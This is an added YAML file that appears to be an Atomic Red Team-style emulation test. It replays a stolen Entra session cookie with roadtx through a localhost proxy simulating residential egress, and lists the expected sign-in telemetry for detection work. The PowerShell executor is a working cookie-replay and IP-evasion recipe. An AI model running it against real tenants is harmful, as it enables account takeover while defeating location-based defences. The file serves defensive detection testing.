@@ -1,0 +1,70 @@
+attack_technique: T1539
+display_name: "Defense Evasion – Residential Proxy Cookie Replay"
+atomic_tests:
+  - name: "Cookie replay via residential proxy egress"
+    auto_generated_guid: d0e1f2a3-b4c5-6789-defa-789012345609
+    description: |
+      Replays a stolen session cookie through a residential proxy to make
+      the sign-in appear to originate from a residential IP address, evading
+      datacenter/hosting-IP detections. This is a custom primitive (allowed
+      gap #3): wraps roadtx for cookie replay while routing egress through
+      a configured residential proxy. The proxy_url input points to a lab
+      SOCKS5/HTTP proxy simulating residential egress.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      session_cookie:
+        description: "Captured session cookie (ESTSAUTH or ESTSAUTHPERSISTENT)."
+        type: String
+        default: "PLACEHOLDER_STOLEN_COOKIE"
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      resource:
+        description: "Target resource URI."
+        type: String
+        default: "https://graph.microsoft.com"
+      proxy_url:
+        description: "Lab proxy URL for residential egress simulation (e.g., socks5://127.0.0.1:1080)."
+        type: Url
+        default: "socks5://127.0.0.1:1080"
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        $env:HTTPS_PROXY = '#{proxy_url}'
+        $env:HTTP_PROXY  = '#{proxy_url}'
+        try {
+            roadtx getcookies `
+              --cookie '#{session_cookie}' `
+              --tenant '#{tenant_id}' `
+              --resource '#{resource}' `
+              --tokenfile '#{token_output_path}'
+        } finally {
+            $env:HTTPS_PROXY = $null
+            $env:HTTP_PROXY  = $null
+        }
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://thedfirreport.com/2023/01/09/you-ve-been-hit-with-a-bec/"
+    auth_profile: "residential-proxy-replay"
+    defense_evasion: "Residential IP egress masks cookie replay as legitimate geography"
+    requires_token: false
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          authenticationProtocol: "none"
+          ipAddress: "RESIDENTIAL_RANGE"
+        within_minutes: 15
+    exercises_chokepoint:
+      id: "DC-EVAS-006"
+      url: "https://detectionchokepoints.com/evasion/residential-proxy-replay"
